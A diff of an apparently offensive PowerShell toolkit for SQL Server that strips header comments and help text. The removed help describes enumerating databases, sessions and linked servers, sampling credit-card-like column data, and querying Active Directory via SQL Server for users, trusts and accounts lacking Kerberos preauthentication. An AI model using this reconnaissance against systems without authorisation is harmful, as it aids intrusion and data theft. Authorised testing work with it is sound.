@@ -147,11 +147,6 @@ Function Get-SQLConnectionObject
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLConnectionTest
-# ----------------------------------
-
 Function  Get-SQLConnectionTest
 {
     <#
@@ -330,11 +325,6 @@ Function  Get-SQLConnectionTest
         $TblResults
     }
 }
-
-
-# ----------------------------------
-#  Get-SQLConnectionTestThreaded
-# ----------------------------------
 
 Function  Get-SQLConnectionTestThreaded
 {
@@ -553,11 +543,6 @@ Function  Get-SQLConnectionTestThreaded
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLQuery
-# ----------------------------------
-
 Function Get-SQLQuery
 {
     <#
@@ -753,11 +738,6 @@ Function Get-SQLQuery
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLQueryThreaded
-# ----------------------------------
-
 Function  Get-SQLQueryThreaded
 {
     <#
@@ -937,12 +917,6 @@ Function  Get-SQLQueryThreaded
         return $TblResults
     }
 }
-
-#endregion
-
-# ----------------------------------
-#  Get-SQLServerInfo
-# ----------------------------------
 
 Function  Get-SQLServerInfo
 {
@@ -1167,11 +1141,6 @@ Function  Get-SQLServerInfo
         $TblServerInfo
     }
 }
-
-
-# ----------------------------------
-#  Get-SQLServerInfoThreaded
-# ----------------------------------
 
 Function  Get-SQLServerInfoThreaded
 {
@@ -1462,10 +1431,6 @@ Function  Get-SQLServerInfoThreaded
 }
 
 
-# ----------------------------------
-#  Get-SQLDatabase
-# ----------------------------------
-
 Function  Get-SQLDatabase
 {
     <#
@@ -1744,58 +1709,8 @@ Function  Get-SQLDatabase
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLDatabaseThreaded
-# ----------------------------------
-
 Function  Get-SQLDatabaseThreaded
 {
-    <#
-            .SYNOPSIS
-            Returns database information from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
-            .PARAMETER DatabaseName
-            Database name to filter for.
-            .PARAMETER NoDefaults
-            Only select non default databases.
-            .PARAMETER HasAccess
-            Only select databases the current user has access to.
-            .PARAMETER SysAdminOnly
-            Only select databases owned by a sysadmin.
-            .PARAMETER Threads
-            Number of concurrent host threads.
-            .EXAMPLE
-            PS C:\> Get-SQLDatabaseThreaded -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb
-
-            ComputerName        : SQLServer1
-            Instance            : SQLServer1\STANDARDDEV2014
-            DatabaseId          : 7
-            DatabaseName        : testdb
-            DatabaseOwner       : sa
-            OwnerIsSysadmin     : 1
-            is_trustworthy_on   : True
-            is_db_chaining_on   : False
-            is_broker_enabled   : True
-            is_encrypted        : False
-            is_read_only        : False
-            create_date         : 4/13/2016 4:27:36 PM
-            recovery_model_desc : FULL
-            FileName            : C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDDEV2014\MSSQL\DATA\testdb.mdf
-            DbSizeMb            : 3.19
-            has_dbaccess        : 1
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseThreaded -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -2058,11 +1973,6 @@ Function  Get-SQLDatabaseThreaded
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLTable
-# ----------------------------------
-
 Function  Get-SQLTable
 {
     <#
@@ -2240,11 +2150,6 @@ Function  Get-SQLTable
         $TblTables
     }
 }
-
-
-# ----------------------------------
-#  Get-SQLColumn
-# ----------------------------------
 
 Function  Get-SQLColumn
 {
@@ -2468,52 +2373,8 @@ Function  Get-SQLColumn
 }
 
 
-# ---------------------------------------
-# Get-SQLColumnSampleData
-# ---------------------------------------
-
 Function Get-SQLColumnSampleData
 {
-    <#
-            .SYNOPSIS
-            Returns column information from target SQL Servers. Supports search by keywords, sampling data, and validating credit card numbers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER $NoOutput
-            Don't output any sample data.
-            .PARAMETER SampleSize
-            Number of records to sample.
-            .PARAMETER Keywords
-            Number of records to sample.
-            .PARAMETER DatabaseName
-            Database to filter on.
-            .PARAMETER ValidateCC
-            Use Luhn formula to check if sample is a valid credit card.
-            Column name filter that support wildcards.
-            .PARAMETER NoDefaults
-            Don't show columns from default databases.
-            .EXAMPLE
-            PS C:\> Get-SQLColumnSampleData -verbose -Instance SQLServer1\STANDARDDEV2014 -Keywords "account,credit,card" -SampleSize 5 -ValidateCC| ft -AutoSize
-            VERBOSE: SQLServer1\STANDARDDEV2014 : START SEARCH DATA BY COLUMN
-            VERBOSE: SQLServer1\STANDARDDEV2014 : CONNECTION SUCCESS
-            VERBOSE: SQLServer1\STANDARDDEV2014 : - Searching for column names that match criteria...
-            VERBOSE: SQLServer1\STANDARDDEV2014 : - Column match: [testdb].[dbo].[tracking].[card]
-            VERBOSE: SQLServer1\STANDARDDEV2014 : - Selecting 5 rows of data sample from column [testdb].[dbo].[tracking].[card].
-            VERBOSE: SQLServer1\STANDARDDEV2014 : COMPLETED SEARCH DATA BY COLUMN
-
-            ComputerName   Instance                   Database Schema Table    Column Sample           RowCount IsCC
-            ------------   --------                   -------- ------ -----    ------ ------           -------- ----
-            SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   4111111111111111 2        True
-            SQLServer1     SQLServer1\STANDARDDEV2014 testdb   dbo    tracking card   41111111111ASDFD 2        False
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLColumnSampleData -Keywords "account,credit,card" -SampleSize 5 -ValidateCC
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -2703,10 +2564,6 @@ Function Get-SQLColumnSampleData
     }
 }
 
-
-# ---------------------------------------
-# Get-SQLColumnSampleDataThreaded
-# ---------------------------------------
 
 Function Get-SQLColumnSampleDataThreaded
 {
@@ -2979,10 +2836,6 @@ Function Get-SQLColumnSampleDataThreaded
 }
 
 
-# ----------------------------------
-#  Get-SQLDatabaseSchema
-# ----------------------------------
-
 Function  Get-SQLDatabaseSchema
 {
     <#
@@ -3152,10 +3005,6 @@ Function  Get-SQLDatabaseSchema
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLView
-# ----------------------------------
 
 Function  Get-SQLView
 {
@@ -3335,59 +3184,8 @@ Function  Get-SQLView
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLServerLink
-# ----------------------------------
-
 Function  Get-SQLServerLink
 {
-    <#
-            .SYNOPSIS
-            Returns link servers from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DatabaseLinkName
-            Database link name to filter for.
-            .EXAMPLE
-            PS C:\> Get-SQLServerLink -Instance SQLServer1\STANDARDDEV2014
-
-            ComputerName           : SQLServer1
-            Instance               : SQLServer1\STANDARDDEV2014
-            DatabaseLinkId         : 0
-            DatabaseLinkName       : SQLServer1\STANDARDDEV2014
-            DatabaseLinkLocation   : Local
-            Product                : SQL Server
-            Provider               : SQLNCLI
-            Catalog                :
-            Local Login            : Uses Self Credentials
-            RemoteLoginName        :
-            is_rpc_out_enabled     : True
-            is_data_access_enabled : False
-            modify_date            : 3/13/2016 12:30:33 PM
-
-            ComputerName           : SQLServer1
-            Instance               : SQLServer1\STANDARDDEV2014
-            DatabaseLinkId         : 1
-            DatabaseLinkName       : SQLServer2\SQLEXPRESS
-            DatabaseLinkLocation   : Remote
-            Product                : SQL Server
-            Provider               : SQLNCLI
-            Catalog                :
-            Local Login            :
-            RemoteLoginName        : user123
-            is_rpc_out_enabled     : False
-            is_data_access_enabled : True
-            modify_date            : 5/6/2016 10:20:44 AM
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLServerLink -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -3507,11 +3305,6 @@ Function  Get-SQLServerLink
         $TblServerLinks
     }
 }
-
-
-# ----------------------------------
-#  Get-SQLServerConfiguration
-# ----------------------------------
 
 Function  Get-SQLServerConfiguration
 {
@@ -3741,11 +3534,6 @@ Function  Get-SQLServerConfiguration
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLServerCredential
-# ----------------------------------
-
 Function  Get-SQLServerCredential
 {
     <#
@@ -3881,9 +3669,6 @@ Function  Get-SQLServerCredential
 }
 
 
-# ----------------------------------
-#  Get-SQLServerLogin
-# ----------------------------------
 Function  Get-SQLServerLogin
 {
     <#
@@ -4053,44 +3838,8 @@ Function  Get-SQLServerLogin
     }
 }
 
-
-
-
-# ----------------------------------
-#  Get-SQLSession
-# ----------------------------------
-
 Function  Get-SQLSession
 {
-    <#
-            .SYNOPSIS
-            Returns active sessions from target SQL Servers.  Sysadmin privileges is required to view all sessions.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .EXAMPLE
-            PS C:\> Get-SQLSession -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1
-
-            ComputerName          : SQLServer1
-            Instance              : SQLServer1\STANDARDDEV2014
-            PrincipalSid          : 010500000000000515000000F3864312345716CC636051C017100000
-            PrincipalName         : Domain\MyUser
-            OriginalPrincipalName : Domain\MyUser
-            SessionId             : 51
-            SessionStartTime      : 06/24/2016 09:26:21
-            SessionLoginTime      : 06/24/2016 09:26:21
-            SessionStatus         : running
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLSession -Verbose
-            .EXAMPLE
-            PS C:\> (Get-SQLSession -Instance SQLServer1\STANDARDDEV2014).count
-            48
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -4235,59 +3984,8 @@ Function  Get-SQLSession
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLOleDbProvder
-# ----------------------------------
-
 Function  Get-SQLOleDbProvder
 {
-    <#
-            .SYNOPSIS
-            Returns a list of the providers installede on SQL Servers and their properties.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER Threads
-            Number of concurrent host threads.
-            PS C:\> Get-SQLOleDbProvder -Instance SQLServer1\STANDARDDEV2014 -Verbose 
-
-            ProviderName         : SQLNCLI11
-            ProviderDescription  : SQL Server Native Client 11.0
-            ProviderParseName    : {397C2819-8272-4532-AD3A-FB5E43BEAA39}
-            AllowInProcess       : 1
-            DisallowAdHocAccess  : 0
-            DynamicParameters    : 0
-            IndexAsAccessPath    : 0
-            LevelZeroOnly        : 0
-            NestedQueries        : 0
-            NonTransactedUpdates : 0
-            SqlServerLIKE        : 0
-            ...
-
-            .EXAMPLE
-            PS C:\> Get-SQLOleDbProvder -Instance SQLServer1\STANDARDDEV2014 -Verbose | FT -AutoSize
-
-            ProviderName             ProviderDescription                                          ProviderParseName                      Allo
-           ------------             -------------------                                          -----------------                      ----
-            SQLOLEDB                 Microsoft OLE DB Provider for SQL Server                     {0C7FF16C-38E3-11d0-97AB-00C04FC2AD98} 0   
-            SQLNCLI11                SQL Server Native Client 11.0                                {397C2819-8272-4532-AD3A-FB5E43BEAA39} 1   
-            Microsoft.ACE.OLEDB.12.0 Microsoft Office 12.0 Access Database Engine OLE DB Provider {3BE786A0-0366-4F5C-9434-25CF162E475E} 0   
-            Microsoft.ACE.OLEDB.15.0 Microsoft Office 15.0 Access Database Engine OLE DB Provider {3BE786A1-0366-4F5C-9434-25CF162E475E} 0   
-            ADsDSOObject             OLE DB Provider for Microsoft Directory Services             {549365d0-ec26-11cf-8310-00aa00b505db} 1   
-            SSISOLEDB                OLE DB Provider for SQL Server Integration Services          {688037C5-0B57-464B-A953-90A806CC34C2} 0   
-            Search.CollatorDSO       Microsoft OLE DB Provider for Search                         {9E175B8B-F52A-11D8-B9A5-505054503030} 0   
-            MSDASQL                  Microsoft OLE DB Provider for ODBC Drivers                   {c8b522cb-5cf3-11ce-ade5-00aa0044773d} 1   
-            MSOLAP                   Microsoft OLE DB Provider for Analysis Services 14.0         {DBC724B0-DD86-4772-BB5A-FCC6CAB2FC1A} 1   
-            MSDAOSP                  Microsoft OLE DB Simple Provider                             {dfc8bdc0-e378-11d0-9b30-0080c7e9fe95} 0  ... 
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLOleDbProvder -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -4564,53 +4262,8 @@ Function  Get-SQLOleDbProvder
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLDomainObject
-# ----------------------------------
-
-# Reference: LDAP templates are based on MSDN and PowerView by Will Schroeder (@HarmJ0y).
 Function  Get-SQLDomainObject
 {
-    <#
-        .SYNOPSIS
-        Using the OLE DB ADSI provider, query Active Directory for a list of domain objects
-        via the domain logon server associated with the SQL Server.  This can be 
-        done using a SQL Server link (OpenQuery) or AdHoc query (OpenRowset).  Use the -UseAdHoc
-        flag to switch between modes. 
-        .PARAMETER Username
-        SQL Server or domain account to authenticate with.
-        .PARAMETER Password
-        SQL Server or domain account password to authenticate with.
-        .PARAMETER LinkUsername
-        Domain account used to authenticate to LDAP through SQL Server ADSI link.
-        .PARAMETER LinkPassword
-        Domain account password used to authenticate to LDAP through SQL Server ADSI link.
-        .PARAMETER UseAdHoc
-        Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.
-        .PARAMETER Credential
-        SQL Server credential.
-        .PARAMETER Instance
-        SQL Server instance to connection to.
-        .PARAMETER Threads
-        Number of concurrent host threads.
-        .PARAMETER LdapPath
-        Ldap path.
-        .PARAMETER LdapFilter
-        LDAP filter.  Example: -LdapFilter ";(&(objectCategory=Person)(objectClass=user))"
-        .PARAMETER LdapFields
-        Ldap fields. Example -LdapFields 'samaccountname,name,admincount,whencreated,whenchanged,adspath;'
-        .EXAMPLE
-        PS C:\> Get-SQLDomainObject -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LdapFilter "(&(objectCategory=Person)(objectClass=user))" -LdapFields "samaccountname,name,admincount,whencreated,whenchanged,adspath" -LdapPath "domain.local"
-        .EXAMPLE
-        PS C:\> Get-SQLDomainObject -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-          .EXAMPLE
-        PS C:\> Get-SQLDomainObject -Instance SQLServer1\STANDARDDEV2014 -Verbose 
-        .EXAMPLE
-        PS C:\> Get-SQLDomainObject -Instance SQLServer1\STANDARDDEV2014 -Verbose -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-        .EXAMPLE
-        PS C:\> Get-SQLInstanceLocal | Get-SQLDomainObject -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -4977,66 +4630,8 @@ Function  Get-SQLDomainObject
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLDomainUser
-# ----------------------------------
-
 Function  Get-SQLDomainUser
 {
-    <#
-            .SYNOPSIS
-            Using the OLE DB ADSI provider, query Active Directory for a list of domain users
-            via the domain logon server associated with the SQL Server.  This can be 
-            done using a SQL Server link (OpenQuery) or AdHoc query (OpenRowset).  Use the -UseAdHoc
-            flag to switch between modes.  The userstate parameter can also be used to filter users
-            by state such as disabled/locked, and property setting such as not requiring a password
-            or kerberos preauthentication.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER LinkUsername
-            Domain account used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER LinkPassword
-            Domain account password used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER UseAdHoc
-            Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER TargetDomain
-            Domain to query.
-            .PARAMETER FilterUser
-            Domain user to filter for.
-            .PARAMETER UserState
-            Filter for users of specific state such as disabled, enabled, and locked.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainUser -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
-            Only grab enabled users.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainUser -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -UserState All
-            Only grab enabled users.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainUser -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -UserState Enabled
-            Only grab disabled users.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainUser -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -UserState Disabled
-            Only grab that don't require kerberos preauthentication.
-            PS C:\> Get-SQLDomainUser -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -UserState PreAuthNotRequired
-            Only grab locked users.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainUser -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -UserState Locked
-            .EXAMPLE
-            PS C:\> Get-SQLDomainUser -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-          .EXAMPLE
-            PS C:\> Get-SQLDomainUser -Instance SQLServer1\STANDARDDEV2014 -Verbose 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainUser -Instance SQLServer1\STANDARDDEV2014 -Verbose -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDomainUser -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -5152,45 +4747,8 @@ Function  Get-SQLDomainUser
 }
 
 
-# ----------------------------------
-#  Get-SQLDomainSubnet
-# ----------------------------------
-
 Function  Get-SQLDomainSubnet
 {
-    <#
-            .SYNOPSIS
-            Using the OLE DB ADSI provider, query Active Directory for a list of domain subnets
-            via the domain logon server associated with the SQL Server.  This can be 
-            done using a SQL Server link (OpenQuery) or AdHoc query (OpenRowset).  Use the -UseAdHoc
-            flag to switch between modes.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER LinkUsername
-            Domain account used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER LinkPassword
-            Domain account password used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER UseAdHoc
-            Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER TargetDomain
-            Domain to query.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-          .EXAMPLE
-            PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDomainComputer -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -5267,45 +4825,8 @@ Function  Get-SQLDomainSubnet
 }
 
 
-# ----------------------------------
-#  Get-SQLDomainSite
-# ----------------------------------
-
 Function  Get-SQLDomainSite
 {
-    <#
-            .SYNOPSIS
-            Using the OLE DB ADSI provider, query Active Directory for a list of domain sites
-            via the domain logon server associated with the SQL Server.  This can be 
-            done using a SQL Server link (OpenQuery) or AdHoc query (OpenRowset).  Use the -UseAdHoc
-            flag to switch between modes.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER LinkUsername
-            Domain account used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER LinkPassword
-            Domain account password used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER UseAdHoc
-            Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER TargetDomain
-            Domain to query.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-          .EXAMPLE
-            PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainComputer -Instance SQLServer1\STANDARDDEV2014 -Verbose -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDomainComputer -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -5381,10 +4902,6 @@ Function  Get-SQLDomainSite
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLDomainComputer
-# ----------------------------------
 
 Function  Get-SQLDomainComputer
 {
@@ -5499,45 +5016,9 @@ Function  Get-SQLDomainComputer
     }
 }
 
-# ----------------------------------
-#  Get-SQLDomainOu
-# ----------------------------------
-
 Function  Get-SQLDomainOu
 {
-    <#
-            .SYNOPSIS
-            Using the OLE DB ADSI provider, query Active Directory for a list of domain organization units (ou)
-            via the domain logon server associated with the SQL Server.  This can be 
-            done using a SQL Server link (OpenQuery) or AdHoc query (OpenRowset).  Use the -UseAdHoc
-            flag to switch between modes.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER LinkUsername
-            Domain account used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER LinkPassword
-            Domain account password used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER UseAdHoc
-            Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER TargetDomain
-            Domain to query.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainOu -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainOu -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-          .EXAMPLE
-            PS C:\> Get-SQLDomainOu -Instance SQLServer1\STANDARDDEV2014 -Verbose 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainOu -Instance SQLServer1\STANDARDDEV2014 -Verbose -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDomainOu -Verbose
-    #>
+
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -5605,46 +5086,9 @@ Function  Get-SQLDomainOu
 }
 
 
-# ----------------------------------
-#  Get-SQLDomainAccountPolicy
-# ----------------------------------
-
-# Reference: https://msdn.microsoft.com/en-us/library/ms682204(v=vs.85).aspx
 Function  Get-SQLDomainAccountPolicy
 {
-    <#
-            .SYNOPSIS
-            Using the OLE DB ADSI provider, query Active Directory for a list of domain account policies
-            via the domain logon server associated with the SQL Server.  This can be 
-            done using a SQL Server link (OpenQuery) or AdHoc query (OpenRowset).  Use the -UseAdHoc
-            flag to switch between modes.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER LinkUsername
-            Domain account used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER LinkPassword
-            Domain account password used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER UseAdHoc
-            Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER TargetDomain
-            Domain to query.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainAccountPolicy -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainAccountPolicy -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-          .EXAMPLE
-            PS C:\> Get-SQLDomainAccountPolicy -Instance SQLServer1\STANDARDDEV2014 -Verbose 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainAccountPolicy -Instance SQLServer1\STANDARDDEV2014 -Verbose -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDomainAccountPolicy -Verbose
-    #>
+
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -5743,48 +5187,8 @@ Function  Get-SQLDomainAccountPolicy
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLDomainGroup
-# ----------------------------------
-
 Function  Get-SQLDomainGroup
 {
-    <#
-            .SYNOPSIS
-            Using the OLE DB ADSI provider, query Active Directory for a list of domain groups
-            via the domain logon server associated with the SQL Server.  This can be 
-            done using a SQL Server link (OpenQuery) or AdHoc query (OpenRowset).  Use the -UseAdHoc
-            flag to switch between modes.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER LinkUsername
-            Domain account used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER LinkPassword
-            Domain account password used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER UseAdHoc
-            Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER TargetDomain
-            Domain to query.
-            .PARAMETER FilterGroup
-            Domain group to filter for.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainGroup -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainGroup -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-          .EXAMPLE
-            PS C:\> Get-SQLDomainGroup -Instance SQLServer1\STANDARDDEV2014 -Verbose 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainGroup -Instance SQLServer1\STANDARDDEV2014 -Verbose -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDomainGroup -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -5861,45 +5265,8 @@ Function  Get-SQLDomainGroup
     }
 }
 
-# ----------------------------------
-#  Get-SQLDomainTrust
-# ----------------------------------
-
 Function  Get-SQLDomainTrust
 {
-    <#
-            .SYNOPSIS
-            Using the OLE DB ADSI provider, query Active Directory for a list of domain trusts
-            via the domain logon server associated with the SQL Server.  This can be 
-            done using a SQL Server link (OpenQuery) or AdHoc query (OpenRowset).  Use the -UseAdHoc
-            flag to switch between modes.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER LinkUsername
-            Domain account used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER LinkPassword
-            Domain account password used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER UseAdHoc
-            Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER TargetDomain
-            Domain to query.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainTrust -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
-            .EXAMPLE
